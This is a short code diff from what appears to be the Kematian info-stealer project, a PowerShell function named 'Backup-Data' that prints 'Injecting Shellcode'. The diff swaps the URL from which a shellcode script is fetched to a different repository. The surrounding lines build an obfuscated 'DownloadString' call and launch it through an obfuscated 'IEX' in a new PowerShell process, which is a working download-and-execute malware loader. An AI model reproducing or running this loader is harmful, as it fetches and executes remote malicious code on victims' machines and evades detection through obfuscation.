@@ -1171,7 +1171,7 @@ function Backup-Data {
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://raw.githubusercontent.com/bat2exe/Kematian/refs/heads/main/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
